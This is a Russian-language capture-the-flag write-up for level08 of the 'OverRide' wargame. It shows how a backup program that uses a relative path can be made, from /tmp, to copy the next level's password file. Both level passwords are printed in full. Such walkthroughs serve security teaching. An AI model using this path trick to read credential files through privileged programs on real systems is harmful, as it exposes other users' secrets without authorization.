1. Логин level08:7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

2. Исследование программы. Она создаёт бекапы, можно сделать backup .pass
```
level08@OverRide:~$ ./level08 ../level09/.pass
ERROR: Failed to open ./backups/../level09/.pass
level08@OverRide:~$ ./level08 ~level09/.pass
ERROR: Failed to open ./backups//home/users/level09
```
Программа использует относительный путь, возможно получиться дотянуться до .pass.
Но у нас нет прав для создания папки backup, куда программа ложит .pass

3. Создадим эту папку
```
level08@OverRide:~$ mkdir -p ./backups//home/users/level09/.pass
mkdir: cannot create directory `./backups//home': Permission denied
```
Нет прав для её создания в папке home, но раз это относительный путь, попробуем сделать это в /tmp

4. Всё получилось
```
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/
home/ .log
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
